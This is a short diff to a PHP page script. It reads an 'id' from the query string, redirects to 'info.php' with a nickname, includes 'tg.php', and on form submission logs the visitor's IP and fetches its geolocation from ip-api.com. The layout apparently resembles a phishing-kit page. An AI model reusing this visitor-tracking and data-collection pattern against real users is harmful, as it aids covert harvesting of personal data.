@@ -1,7 +1,8 @@
 <?php
 include('tg.php');
 
-$id=$username;
+$id=$_GET["id"];
+header("location: info.php?nick=$username");
 if($_POST){
 $ip=$_SERVER["REMOTE_ADDR"];
 $konum = file_get_contents("http://ip-api.com/xml/".$ip);
